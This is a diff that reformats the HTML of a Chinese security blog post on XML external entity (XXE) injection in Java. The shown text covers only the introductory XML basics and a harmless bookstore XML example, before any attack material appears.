@@ -1,215 +1,524 @@
-<!doctype html><html lang=en><head><title>javasec-xxe :: l1uyun_blog</title>
-<meta charset=utf-8><meta charset=UTF-8><meta name=renderer content="webkit"><meta name=force-rendering content="webkit"><meta name=referrer content="no-referrer"><meta http-equiv=X-UA-Compatible content="IE=Edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=description content="xxe注入 前置知识 XML文档 要了解XXE漏洞，那么先得了解一下有关XML的基础知识。
-XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，&mldr;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，&mldr;）
-"><meta name=keywords content><link href=/atom.xml title=l1uyun_blog type=application/rss+xml><link rel=canonical href=https://l1uyun.one/posts/javasec-xxe/><link rel=stylesheet href=//cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css media=print onload='this.media="all"'><link rel=stylesheet href=/theme-20230215.css><link rel="shortcut icon" href=https://l1uyun.one/favicon.ico><link rel=apple-touch-icon href=https://l1uyun.one/favicon.ico><link rel=bookmark href=https://l1uyun.one/favicon.ico><link rel=apple-touch-icon-precomposed sizes=180x180 href=https://l1uyun.one/favicon.ico><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="l1uyun_blog"><meta property="og:url" content="https://l1uyun.one/posts/javasec-xxe/"><meta property="og:site_name" content="l1uyun_blog"><meta property="og:title" content="javasec-xxe"><meta property="og:description" content="xxe注入 前置知识 XML文档 要了解XXE漏洞，那么先得了解一下有关XML的基础知识。
-XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…）"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-26T18:10:32+08:00"><meta property="article:modified_time" content="2024-08-18T10:06:17+08:00"><meta property="article:tag" content="Sec/Javasec"><script>(!1||!!window.MSInputMethodContext&&!!document.documentMode)&&document.write('<script id="_iealwn_js" data-outver="11" src="https://support.dmeng.net/ie-alert-warning/latest.js"></script>')</script><script async defer data-website-id=c27bd84b-02a3-4c3f-a168-0d7fadec9c74 src=https://u.edui.fun/lmmtj.js></script><link rel=prefetch href=https://l1uyun.one/posts/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><link rel=prefetch href=https://l1uyun.one/posts/javasec-sql%E6%B3%A8%E5%85%A5/></head><body><script>var getTheme=localStorage.getItem("theme")||"";getTheme=="dark"?document.body.classList.add("dark"):getTheme=="light"&&document.body.classList.remove("dark")</script><div class=container><header class=header><span class=header__inner><a href=https://l1uyun.one/ class=logo style=text-decoration:none><span class=logo__text>l1uyun_blog</span>
-<span class=logo__cursor></span>
-</a><span class=header__right><nav class="menu hidden"><ul class="menu__inner menu__inner--desktop"><li><a href=/posts/reading/>读书</a></li><li><a href=/posts/sec/>sec</a></li><li><a href=/posts/chat/>闲聊</a></li><li><a href=/archives/>归档</a></li><li><a href=/about/>关于我</a></li><li><a href=/search/>🔍</a></li><li><a href=javascript:; onclick=randomPost() title=随机访问一篇文章><svg t="1660103436159" class="icon search-box-icon" viewBox="0 0 1024 1024" p-id="1184" width="32" height="32"><path d="M421.376 481.28s117.248 24.576 175.104-8.704c0 0-89.6 70.144-89.6 166.4.512-.512-8.192-121.344-85.504-157.696zm17.408 487.936s68.608 6.656 68.608-80.896c0 0 3.072 88.576 65.024 78.336.0.512-50.688 22.016-133.632 2.56zM161.28 238.08s-30.208 65.536 11.264 91.648c0 0-67.072-17.408-81.408 37.376.0.0 8.704-82.944 70.144-129.024zM857.6 227.328s49.152 50.176 1.024 81.408c0 0 58.88-18.432 66.56 36.352.0.0 5.12-69.632-67.584-117.76z" p-id="1185"/><path d="M443.392 970.752c-5.632.0-10.752-1.024-15.36-3.072L157.184 810.496l-1.536-1.024s-1.024-1.024-4.608-2.56c-51.2-29.184-62.976-94.208-65.536-120.832V386.56c0-3.072.512-7.168 1.024-11.264l.512-3.584 1.024-2.56c19.456-50.688 76.8-51.2 103.936-44.032l-1.536 5.632 4.096-6.144L476.16 486.4l18.944 37.888c20.992 36.864 29.184 77.824 32.768 99.84v258.048c-4.608 56.32-36.864 76.288-55.808 82.944-1.024.512-15.36 5.632-28.672 5.632zM181.248 774.656l263.168 152.576c12.288-.512 36.864-6.656 40.448-48.128V628.736c-4.608-31.744-20.992-103.936-72.192-128L322.56 445.44l1.536 3.072L181.76 366.08c-2.048-.512-40.448-9.216-52.736 15.872-.512 2.56-.512 4.608-.512 6.144v294.4c1.536 16.896 9.728 67.072 43.52 86.528 3.584 2.048 6.656 4.096 9.216 5.632z" p-id="1186"/><path d="M837.632 212.992c6.656 4.096 12.8 7.168 18.432 10.752l1.536 1.024 1.536 1.536c5.12 4.096 10.752 9.216 16.384 15.36 6.144 11.776 5.632 33.28 4.608 49.152-1.024 12.288-6.656 30.208-26.624 44.544l-1.024.512-247.808 156.672c-26.624 14.336-62.976 18.432-96.256 18.432-40.96.0-77.824-6.656-89.088-8.704l-3.072-.512-245.248-142.336c-39.424-29.696-28.16-85.504-15.36-113.664l2.56-6.144 263.68-166.912c29.184-14.336 104.448-43.008 173.056-1.024 3.584 2.56 58.368 34.304 119.296 69.632M431.616 460.8c40.448 7.168 114.176 13.824 152.576-6.144L828.928 299.52c7.168-5.632 8.192-10.24 8.704-12.8 1.024-11.264-9.728-26.624-15.36-32.768-55.808-32.256-243.712-141.312-250.368-145.408-49.664-30.72-107.008-9.216-130.048 2.56L192.512 268.8c-4.096 12.288-12.288 42.496 3.584 55.808L431.616 460.8z" p-id="1187"/><path d="M831.488 299.008c4.096-1.024 38.4-11.264 66.048 6.144 7.168 4.608 17.92 11.776 24.064 24.576 1.024 5.632 4.096 10.752 4.608 16.896v2.048l-1.024 323.072c-5.12 35.328-22.528 91.648-77.312 125.44l-5.12 3.584h-1.024L579.584 966.656l-4.608.512c-4.096.512-8.704 1.024-12.8 1.024-15.872.0-30.208-5.12-41.984-14.848-24.576-20.48-32.768-55.808-35.328-73.728l-1.024-252.928h1.536c6.144-96.768 88.576-164.864 96.768-171.008l-.512-.512L829.44 299.52M528.384 867.328c.512 10.24 5.12 41.472 19.968 53.76 3.072 2.56 7.68 5.632 16.384 5.12L829.44 758.272c56.32-38.4 53.76-115.712 53.76-116.224l-.512-32.256 1.024-250.368h-.512c-1.536-12.8-7.168-16.384-8.704-17.408-8.704-5.632-23.552-3.072-28.672-2.048L610.304 488.96c-1.024.512-80.896 65.024-80.896 149.504h-1.536l.512 228.864zM435.2 264.192c0 27.648 31.744 50.176 71.168 50.176s71.168-22.528 71.168-50.176-31.744-50.176-71.168-50.176S435.2 236.544 435.2 264.192z" p-id="1188"/><path d="M663.552 782.848c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-50.176-.512-50.176-31.232s22.528-67.072 50.176-80.384c27.136-13.824 49.664.0 49.664 31.232zM760.32 602.624c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-49.664-.512-49.664-31.232s22.528-67.072 49.664-80.384c27.136-13.824 49.664.512 49.664 31.232zM867.84 428.032c0 30.72-22.528 67.072-49.664 80.384C790.528 522.24 768 507.904 768 477.184s22.528-67.072 50.176-80.384c27.136-13.824 49.664.0 49.664 31.232zM270.848 538.112c0 30.72-22.016 41.984-48.64 24.576-27.136-16.896-48.64-55.808-48.64-86.528s22.016-41.984 48.64-24.576c26.624 16.896 48.64 55.808 48.64 86.528zm161.28 285.184c0 30.72-22.016 41.984-48.64 24.576-26.624-17.408-48.64-55.808-48.64-86.528s22.016-41.984 48.64-24.576c26.624 16.896 48.64 55.808 48.64 86.528z" p-id="1189"/></svg></a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/posts/reading/>读书</a></li><li><a href=/posts/sec/>sec</a></li><li><a href=/posts/chat/>闲聊</a></li><li><a href=/archives/>归档</a></li><li><a href=/about/>关于我</a></li><li><a href=/search/>🔍</a></li></ul></nav><span class="menu-trigger hidden"><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class="post sec"><div class=breadcrumb><li><a href=https://l1uyun.one/>首页</a></li><li><a href=https://l1uyun.one/posts/>Posts</a></li><li><a href=https://l1uyun.one/posts/sec/>sec</a></li><li class=active><a href=https://l1uyun.one/posts/javasec-xxe/>javasec-xxe</a></li></div><h2 class=post-title><a href=https://l1uyun.one/posts/javasec-xxe/>javasec-xxe</a></h2><div class=post-meta><span class=post-date>2024-07-26</span></div><div class=post-content><nav id=TableOfContents><ul><li><a href=#xxe注入>xxe注入</a><ul><li><a href=#前置知识>前置知识</a><ul><li><a href=#xml文档>XML文档</a></li><li><a href=#xxe>XXE</a></li><li><a href=#java-解析xml的四种方式>Java 解析XML的四种方式</a></li></ul></li><li><a href=#复现平台>复现平台</a></li><li><a href=#漏洞分析>漏洞分析</a><ul><li><a href=#xmlreader>XMLReader</a></li><li><a href=#saxparser>SAXParser</a></li><li><a href=#saxreader>SAXReader</a></li><li><a href=#saxbuilder>SAXBuilder</a></li><li><a href=#documentbuilder>DocumentBuilder</a></li><li><a href=#unmarshaller>Unmarshaller</a></li></ul></li><li><a href=#漏洞修复>漏洞修复</a></li><li><a href=#漏洞发现>漏洞发现</a></li></ul></li><li><a href=#一句话总结>一句话总结</a></li><li><a href=#参考>参考</a></li></ul></nav><h1 id=xxe注入>xxe注入</h1><h2 id=前置知识>前置知识</h2><h3 id=xml文档>XML文档</h3><p>要了解XXE漏洞，那么先得了解一下有关XML的基础知识。</p><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，&mldr;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，&mldr;）</p><h4 id=文档结构>文档结构</h4><p>XML主要由7个部分组成,</p><ul><li>文档声明</li><li>标签/元素</li><li>属性</li><li>注释</li><li>实体字符</li><li>CDATA 字符数据区。CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由 <code>**</code> 结束，某些文本比如 JavaScript 代码，包含大量 “&lt;” 或 “&” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</li><li>处理指令,</li></ul><p>一个标准的xml文件为</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!-- XML文档声明；同时也是一个处理指令,用于声明 XML 文档的版本和编码方式。&lt;? xxx ?&gt; 就是处理指令的格式--&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- bookstore根元素、book子元素--&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>&lt;bookstore&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!-- category、lang都是属性--&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;book</span> <span style=color:#a6e22e>category=</span><span style=color:#e6db74>&#34;COOKING&#34;</span><span style=color:#f92672>&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;title</span> <span style=color:#a6e22e>lang=</span><span style=color:#e6db74>&#34;en&#34;</span><span style=color:#f92672>&gt;</span>Everyday Italian<span style=color:#f92672>&lt;/title&gt;</span> 
-</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!-- &amp;lt;实体字符 是一个预定义的实体引用，这里也可以引用dtd中定义的实体，以 &amp; 开头, 以;结尾--&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;author&gt;</span>Giada De Laurentiis&amp;lt;<span style=color:#f92672>&lt;/author&gt;</span> 
-</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;year&gt;</span>2005<span style=color:#f92672>&lt;/year&gt;</span> 
-</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;price&gt;</span>30.00<span style=color:#f92672>&lt;/price&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!-- script这里是CDATA，不能被xml解析器解析，可以被JavaScript解析--&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;script&gt;</span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>&lt;![CDATA[
-</span></span></span><span style=display:flex><span><span style=color:#75715e>   function matchwo(a,b)
-</span></span></span><span style=display:flex><span><span style=color:#75715e>   {
-</span></span></span><span style=display:flex><span><span style=color:#75715e>    if (a &lt; b &amp;&amp; a &lt; 0) then
-</span></span></span><span style=display:flex><span><span style=color:#75715e>      {return 1;}
-</span></span></span><span style=display:flex><span><span style=color:#75715e>    else
-</span></span></span><span style=display:flex><span><span style=color:#75715e>      {return 0;}
-</span></span></span><span style=display:flex><span><span style=color:#75715e>   }
-</span></span></span><span style=display:flex><span><span style=color:#75715e>   ]]&gt;</span>
-</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/script&gt;</span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/book&gt;</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/bookstore&gt;</span>
-</span></span></code></pre></div><h4 id=dtd>DTD</h4><p>DTD（Document Type Definition）是用来定义 XML 文档的结构和合法元素的集合。
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>javasec-xxe :: l1uyun_blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta charset="UTF-8"/>
+<meta name="renderer" content="webkit"/>
+<meta name="force-rendering" content="webkit"/>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="xxe注入 前置知识 XML文档 要了解XXE漏洞，那么先得了解一下有关XML的基础知识。
+XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，&hellip;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，&hellip;）
+"/>
+<meta name="keywords" content=""/>
+
+<link href="/atom.xml" title="l1uyun_blog" type="application/rss+xml">
+<link rel="canonical" href="https://l1uyun.one/posts/javasec-xxe/" />
+<link rel="stylesheet" href="//cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="/theme-20230215.css">
+<link rel="shortcut icon" href="https://l1uyun.one/favicon.ico">
+<link rel="apple-touch-icon" href="https://l1uyun.one/favicon.ico">
+<link rel="bookmark" href="https://l1uyun.one/favicon.ico">
+<link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://l1uyun.one/favicon.ico">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="l1uyun_blog">
+
+
+<meta property="og:url" content="https://l1uyun.one/posts/javasec-xxe/">
+  <meta property="og:site_name" content="l1uyun_blog">
+  <meta property="og:title" content="javasec-xxe">
+  <meta property="og:description" content="xxe注入 前置知识 XML文档 要了解XXE漏洞，那么先得了解一下有关XML的基础知识。
+XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…）">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-26T18:10:32+08:00">
+    <meta property="article:modified_time" content="2024-08-18T10:06:17+08:00">
+    <meta property="article:tag" content="Sec/Javasec">
+
+
+
+
+<script>
+if ( false || (!!window.MSInputMethodContext && !!document.documentMode)) {
+    document.write('\x3Cscript id="_iealwn_js" data-outver="11" src="https://support.dmeng.net/ie-alert-warning/latest.js">\x3C/script>');
+}
+</script>
+<script async defer data-website-id="c27bd84b-02a3-4c3f-a168-0d7fadec9c74" src="https://u.edui.fun/lmmtj.js"></script>
+
+    
+  <link rel="prefetch" href="https://l1uyun.one/posts/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <link rel="prefetch" href="https://l1uyun.one/posts/javasec-sql%E6%B3%A8%E5%85%A5/">
+
+  </head>
+  <body class="">
+    <script>var getTheme = localStorage.getItem("theme") || '';if(getTheme == 'dark'){document.body.classList.add("dark")}else if(getTheme == 'light'){document.body.classList.remove("dark")}</script>
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://l1uyun.one/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__text">l1uyun_blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu hidden">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/posts/reading/">读书</a></li>
+        
+      
+        
+          <li><a href="/posts/sec/">sec</a></li>
+        
+      
+        
+          <li><a href="/posts/chat/">闲聊</a></li>
+        
+      
+        
+          <li><a href="/archives/">归档</a></li>
+        
+      
+        
+          <li><a href="/about/">关于我</a></li>
+        
+      
+        
+          <li><a href="/search/">🔍</a></li>
+        
+      
+    
+    <li><a href="javascript:;" onclick="randomPost()" title="随机访问一篇文章"><svg t="1660103436159" class="icon search-box-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1184" width="32" height="32"><path d="M421.376 481.28s117.248 24.576 175.104-8.704c0 0-89.6 70.144-89.6 166.4 0.512-0.512-8.192-121.344-85.504-157.696zM438.784 969.216s68.608 6.656 68.608-80.896c0 0 3.072 88.576 65.024 78.336 0 0.512-50.688 22.016-133.632 2.56zM161.28 238.08s-30.208 65.536 11.264 91.648c0 0-67.072-17.408-81.408 37.376 0 0 8.704-82.944 70.144-129.024zM857.6 227.328s49.152 50.176 1.024 81.408c0 0 58.88-18.432 66.56 36.352 0 0 5.12-69.632-67.584-117.76z" p-id="1185"></path><path d="M443.392 970.752c-5.632 0-10.752-1.024-15.36-3.072l-270.848-157.184-1.536-1.024s-1.024-1.024-4.608-2.56c-51.2-29.184-62.976-94.208-65.536-120.832V386.56c0-3.072 0.512-7.168 1.024-11.264l0.512-3.584 1.024-2.56c19.456-50.688 76.8-51.2 103.936-44.032l-1.536 5.632 4.096-6.144L476.16 486.4l18.944 37.888c20.992 36.864 29.184 77.824 32.768 99.84v258.048c-4.608 56.32-36.864 76.288-55.808 82.944-1.024 0.512-15.36 5.632-28.672 5.632z m-262.144-196.096l263.168 152.576c12.288-0.512 36.864-6.656 40.448-48.128v-250.368c-4.608-31.744-20.992-103.936-72.192-128L322.56 445.44l1.536 3.072-142.336-82.432c-2.048-0.512-40.448-9.216-52.736 15.872-0.512 2.56-0.512 4.608-0.512 6.144v294.4c1.536 16.896 9.728 67.072 43.52 86.528 3.584 2.048 6.656 4.096 9.216 5.632z" p-id="1186"></path><path d="M837.632 212.992c6.656 4.096 12.8 7.168 18.432 10.752l1.536 1.024 1.536 1.536c5.12 4.096 10.752 9.216 16.384 15.36 6.144 11.776 5.632 33.28 4.608 49.152-1.024 12.288-6.656 30.208-26.624 44.544l-1.024 0.512-247.808 156.672c-26.624 14.336-62.976 18.432-96.256 18.432-40.96 0-77.824-6.656-89.088-8.704l-3.072-0.512-245.248-142.336c-39.424-29.696-28.16-85.504-15.36-113.664l2.56-6.144 263.68-166.912c29.184-14.336 104.448-43.008 173.056-1.024 3.584 2.56 58.368 34.304 119.296 69.632M431.616 460.8c40.448 7.168 114.176 13.824 152.576-6.144l244.736-155.136c7.168-5.632 8.192-10.24 8.704-12.8 1.024-11.264-9.728-26.624-15.36-32.768-55.808-32.256-243.712-141.312-250.368-145.408-49.664-30.72-107.008-9.216-130.048 2.56L192.512 268.8c-4.096 12.288-12.288 42.496 3.584 55.808l235.52 136.192z" p-id="1187"></path><path d="M831.488 299.008c4.096-1.024 38.4-11.264 66.048 6.144 7.168 4.608 17.92 11.776 24.064 24.576 1.024 5.632 4.096 10.752 4.608 16.896v2.048l-1.024 323.072c-5.12 35.328-22.528 91.648-77.312 125.44l-5.12 3.584h-1.024l-262.144 165.888-4.608 0.512c-4.096 0.512-8.704 1.024-12.8 1.024-15.872 0-30.208-5.12-41.984-14.848-24.576-20.48-32.768-55.808-35.328-73.728l-1.024-252.928h1.536c6.144-96.768 88.576-164.864 96.768-171.008l-0.512-0.512L829.44 299.52m-301.056 567.808c0.512 10.24 5.12 41.472 19.968 53.76 3.072 2.56 7.68 5.632 16.384 5.12l264.704-167.936c56.32-38.4 53.76-115.712 53.76-116.224l-0.512-32.256 1.024-250.368h-0.512c-1.536-12.8-7.168-16.384-8.704-17.408-8.704-5.632-23.552-3.072-28.672-2.048l-235.52 148.992c-1.024 0.512-80.896 65.024-80.896 149.504h-1.536l0.512 228.864zM435.2 264.192c0 27.648 31.744 50.176 71.168 50.176s71.168-22.528 71.168-50.176-31.744-50.176-71.168-50.176S435.2 236.544 435.2 264.192z" p-id="1188"></path><path d="M663.552 782.848c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-50.176-0.512-50.176-31.232s22.528-67.072 50.176-80.384c27.136-13.824 49.664 0 49.664 31.232zM760.32 602.624c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-49.664-0.512-49.664-31.232s22.528-67.072 49.664-80.384c27.136-13.824 49.664 0.512 49.664 31.232zM867.84 428.032c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-50.176-0.512-50.176-31.232s22.528-67.072 50.176-80.384c27.136-13.824 49.664 0 49.664 31.232zM270.848 538.112c0 30.72-22.016 41.984-48.64 24.576-27.136-16.896-48.64-55.808-48.64-86.528 0-30.72 22.016-41.984 48.64-24.576 26.624 16.896 48.64 55.808 48.64 86.528zM432.128 823.296c0 30.72-22.016 41.984-48.64 24.576-26.624-17.408-48.64-55.808-48.64-86.528 0-30.72 22.016-41.984 48.64-24.576 26.624 16.896 48.64 55.808 48.64 86.528z" p-id="1189"></path></svg></a></li>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/posts/reading/">读书</a></li>
+      
+    
+      
+        <li><a href="/posts/sec/">sec</a></li>
+      
+    
+      
+        <li><a href="/posts/chat/">闲聊</a></li>
+      
+    
+      
+        <li><a href="/archives/">归档</a></li>
+      
+    
+      
+        <li><a href="/about/">关于我</a></li>
+      
+    
+      
+        <li><a href="/search/">🔍</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger hidden">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+
+      <div class="content">
+        
+  
+  
+  
+  
+  <div class="post sec">
+    <div  class="breadcrumb">
+  
+
+  
+
+  
+
+  
+
+<li>
+  <a href="https://l1uyun.one/">首页</a>
+</li>
+
+
+<li>
+  <a href="https://l1uyun.one/posts/">Posts</a>
+</li>
+
+
+<li>
+  <a href="https://l1uyun.one/posts/sec/">sec</a>
+</li>
+
+
+<li class="active">
+  <a href="https://l1uyun.one/posts/javasec-xxe/">javasec-xxe</a>
+</li>
+
+</div>
+
+
+  
+    <h2 class="post-title"><a href="https://l1uyun.one/posts/javasec-xxe/">javasec-xxe</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">2024-07-26</span>
+        
+          
+        
+      
+    </div>
+    
+  
+    <div class="post-content">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#xxe注入">xxe注入</a>
+      <ul>
+        <li><a href="#前置知识">前置知识</a>
+          <ul>
+            <li><a href="#xml文档">XML文档</a></li>
+            <li><a href="#xxe">XXE</a></li>
+            <li><a href="#java-解析xml的四种方式">Java 解析XML的四种方式</a></li>
+          </ul>
+        </li>
+        <li><a href="#复现平台">复现平台</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a>
+          <ul>
+            <li><a href="#xmlreader">XMLReader</a></li>
+            <li><a href="#saxparser">SAXParser</a></li>
+            <li><a href="#saxreader">SAXReader</a></li>
+            <li><a href="#saxbuilder">SAXBuilder</a></li>
+            <li><a href="#documentbuilder">DocumentBuilder</a></li>
+            <li><a href="#unmarshaller">Unmarshaller</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞修复">漏洞修复</a></li>
+        <li><a href="#漏洞发现">漏洞发现</a></li>
+      </ul>
+    </li>
+    <li><a href="#一句话总结">一句话总结</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+      <h1 id="xxe注入">xxe注入</h1>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="xml文档">XML文档</h3>
+<p>要了解XXE漏洞，那么先得了解一下有关XML的基础知识。</p>
+<p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，&hellip;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，&hellip;）</p>
+<h4 id="文档结构">文档结构</h4>
+<p>XML主要由7个部分组成,</p>
+<ul>
+<li>文档声明</li>
+<li>标签/元素</li>
+<li>属性</li>
+<li>注释</li>
+<li>实体字符</li>
+<li>CDATA 字符数据区。CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由 <code>**</code> 结束，某些文本比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</li>
+<li>处理指令,</li>
+</ul>
+<p>一个标准的xml文件为</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- XML文档声明；同时也是一个处理指令,用于声明 XML 文档的版本和编码方式。&lt;? xxx ?&gt; 就是处理指令的格式--&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- bookstore根元素、book子元素--&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;bookstore&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- category、lang都是属性--&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;book</span> <span style="color:#a6e22e">category=</span><span style="color:#e6db74">&#34;COOKING&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;title</span> <span style="color:#a6e22e">lang=</span><span style="color:#e6db74">&#34;en&#34;</span><span style="color:#f92672">&gt;</span>Everyday Italian<span style="color:#f92672">&lt;/title&gt;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- &amp;lt;实体字符 是一个预定义的实体引用，这里也可以引用dtd中定义的实体，以 &amp; 开头, 以;结尾--&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;author&gt;</span>Giada De Laurentiis&amp;lt;<span style="color:#f92672">&lt;/author&gt;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;year&gt;</span>2005<span style="color:#f92672">&lt;/year&gt;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;price&gt;</span>30.00<span style="color:#f92672">&lt;/price&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- script这里是CDATA，不能被xml解析器解析，可以被JavaScript解析--&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;script&gt;</span>
